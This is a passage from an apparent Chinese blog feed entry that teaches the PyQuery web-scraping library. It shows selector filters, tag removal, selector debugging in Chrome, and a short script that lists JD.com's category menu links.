li:gt(1)'</span>).items()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lis:</span><br><span class="line">    print(i.text(),i(<span class="string">'a'</span>).attr(<span class="string">'href'</span>))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># gt就是greater than,大于的意思，lt (less than)是小于</span></span><br></pre></td></tr></table></figure><p>筛选文本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">lis = doc(<span class="string">'div.content ul'</span>).items()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lis:</span><br><span class="line">    <span class="comment">#文本包含问号的li标签</span></span><br><span class="line">    print(i(<span class="string">"li:contains('？')"</span>).text())</span><br></pre></td></tr></table></figure><p>2.修改标签属性</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#用remove把特定标签移除，然后再进行遍历</span></span><br><span class="line">lis = doc(<span class="string">'div.content ul'</span>).remove(<span class="string">'.content-article'</span>).items()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lis:</span><br><span class="line">    print(i.text())</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 还有如修改属性，增加css之类的一些使用率较低的，用到的时候去官方文档查</span></span><br></pre></td></tr></table></figure><p>###### </p><h6 id="直接在Chrome里调试"><a href="#直接在Chrome里调试" class="headerlink" title="直接在Chrome里调试"></a>直接在Chrome里调试</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Chrome浏览器自带css的查询方法，按f12或者右键检查，打开Elements面板，按ctrl+f，</span><br><span class="line"></span><br><span class="line">这里支持xpath，css语法，以及普通的字符查找</span><br><span class="line"></span><br><span class="line">要注意的是右边的数字，显示的是满足条件的标签数量，可以按向下的箭头过一遍，看看是不是自己想要的信息。</span><br></pre></td></tr></table></figure><p>京东的商品栏目</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://www.jd.com/'</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化</span></span><br><span class="line">doc = pq(r.text)</span><br><span class="line"></span><br><span class="line">flag = <span class="number">1</span></span><br><span class="line"><span class="comment"># for i in doc("li.cate_menu_item:nth-child(3) a").items():</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> doc(<span class="string">"li.cate_menu_item:gt(1) a"</span>).items():</span><br><span class="line">    <span class="comment"># print(i.text())</span></span><br><span class="line">    print(i.attr(<span class="string">'href'</span>))</span><br><span class="line">    print(i.text())</span><br><span class="line">    flag = flag + <span class="number">1</span></span><br><span class="line">    print(<span class="string">"------------"</span>)</span><br><span class="line"></span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure><blockquote><p>参考文章：<a href="https://www.jianshu.com/p/7eb136bbe317" target="_blank" rel="noopener">https://www.jianshu.com/p/7eb136bbe317</a></p></blockquote><blockquote><p>更多用法：<a href="https://pythonhosted.org/pyquery/" target="_blank" rel="noopener">https://pythonhosted.org/pyquery/</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;Python爬虫解析库，主流的有&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;PyQuery&lt;/li&gt;
&lt;li&gt;Beautifulsoup&lt;/li&gt;
&lt;li&gt;Scrapy Selectors&lt;/li&gt;
&lt;li&gt;正则表达式。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;PyQ
      
    
    </summary>
    
      <category term="Python" scheme="http://www.xpshuai.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://www.xpshuai.cn/tags/Python/"/>
    
      <category term="PyQuery" scheme="http://www.xpshuai.cn/tags/PyQuery/"/>
    
  </entry>
  
</feed>
